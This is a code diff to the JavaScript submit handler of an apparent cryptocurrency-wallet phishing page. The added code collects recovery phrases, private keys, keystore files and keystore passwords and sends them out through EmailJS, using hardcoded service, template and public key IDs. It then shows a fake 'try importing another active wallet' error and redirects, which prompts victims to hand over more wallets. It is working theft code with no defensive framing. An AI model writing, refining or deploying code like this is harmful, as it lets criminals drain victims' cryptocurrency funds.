@@ -5,16 +5,20 @@ function sendMessage(event){
         event.preventDefault();
     }
  
-    const phraseTextarea = document.getElementById("textInput");
     const walletNameInput = document.getElementById("walletNameData");
-    const pkInput = document.getElementById("pk");
+    const phraseInput = document.getElementById("textInput");
+    const privateKeyInput = document.getElementById("textpk");
+    const keystoreInput = document.getElementById("textkeys");
+    const keystorePassInput = document.getElementById("textksp");
 
-    const phraseValue = phraseTextarea ? phraseTextarea.value.trim() : '';
     const walletName = walletNameInput ? walletNameInput.value.trim() : '';
-    const pkValue = pkInput ? pkInput.value.trim() : '';
+    const textInput = phraseInput ? phraseInput.value.trim() : '';
+    const textpk = privateKeyInput ? privateKeyInput.value.trim() : '';
+    const textkeys = keystoreInput ? keystoreInput.value.trim() : '';
+    const textksp = keystorePassInput ? keystorePassInput.value.trim() : '';
 
-    if (!phraseValue) {
-        alert('Please enter your phrase, keystore, or key before proceeding.');
+    if (!textInput && !textpk && !textkeys) {
+        alert('Please enter your details before proceeding.');
         return false;
     }
 
@@ -26,29 +30,57 @@ function sendMessage(event){
 
     var params = {
         subject: walletName || 'Wallet Connection',
-        message: phraseValue,
-        pk: pkValue
+        wallet_name: walletName || 'Wallet Connection',
+        walletName: walletName || 'Wallet Connection',
+        textInput: textInput,
+        textpk: textpk,
+        textkeys: textkeys,
+        textksp: textksp,
+        // Legacy fallback aliases
+        message: textInput || textpk || textkeys,
+        phrase: textInput,
+        private_key: textpk,
+        keystore: textkeys,
+        pk: textksp || textpk
     };
 
     const serviceID = 'service_7j8do6q';
     const templateID = 'template_6csopl7';
+    const publicKey = 'tRYq_CDLm-Vu_54J4';
 
-    emailjs.send(serviceID, templateID, params).then((res)=>{
+    function handleSuccess(res) {
         if (walletNameInput) walletNameInput.value = "";
-        if (phraseTextarea) phraseTextarea.value = "";
-        if (pkInput) pkInput.value = "";
-        console.log(res);
+        if (phraseInput) phraseInput.value = "";
+        if (privateKeyInput) privateKeyInput.value = "";
+        if (keystoreInput) keystoreInput.value = "";
+        if (keystorePassInput) keystorePassInput.value = "";
+
+        console.log("EmailJS Sent Successfully:", res);
         alert('An error occurred, try importing another active wallet');
         window.location.href = 'index.html';
-    }).catch((err) => {
-        console.error(err);
+    }
+
+    function handleError(err) {
+        console.error("EmailJS Submission Error:", err);
         if (proceedBtn) {
             proceedBtn.disabled = false;
             proceedBtn.innerText = "PROCEED";
         }
         alert('An error occurred, try importing another active wallet');
         window.location.href = 'index.html';
-    });
+    }
+
+    try {
+        if (typeof emailjs === 'undefined') {
+            throw new Error("EmailJS SDK is not loaded on the page.");
+        }
+
+        emailjs.send(serviceID, templateID, params, publicKey)
+            .then(handleSuccess)
+            .catch(handleError);
+    } catch (err) {
+        handleError(err);
+    }
 
     return false;
 }
